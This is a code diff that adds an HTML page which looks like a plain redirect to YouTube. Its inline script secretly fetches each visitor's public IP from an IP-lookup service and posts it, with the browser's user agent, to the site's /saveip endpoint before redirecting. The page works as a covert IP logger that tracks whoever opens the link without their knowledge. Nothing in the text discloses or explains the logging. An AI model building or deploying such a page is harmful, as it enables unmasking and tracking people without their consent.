@@ -1,0 +1,37 @@
+
+  <script>
+  function saveip(ip) {
+    try {
+      var data = JSON.stringify({
+        "query": ip, 
+        "useragent": navigator.userAgent
+      });
+      var url = window.location.origin+'/saveip'
+      var requests = new XMLHttpRequest();
+      requests.open('POST', url, true);
+      requests.setRequestHeader("Content-Type", "application/json");
+      requests.send(data);
+    } catch(e) {
+      return;
+    };
+  };
+
+  function main() {
+    try {
+      let i = document.getElementById('redirect');
+      var requests = new XMLHttpRequest();
+      requests.open("GET", "https://api.ipify.org", true);
+      requests.send(null)
+      requests.onreadystatechange = function() {
+      var ip = requests.responseText;
+      saveip(ip)
+      i.innerHTML = '<meta http-equiv="refresh" content="0; url=https://youtube.com">'
+        };
+      } catch(e) { 
+      return;
+    };
+  };
+  </script>
+  <body onload="main()" id='redirect'>
+  </body>
+  
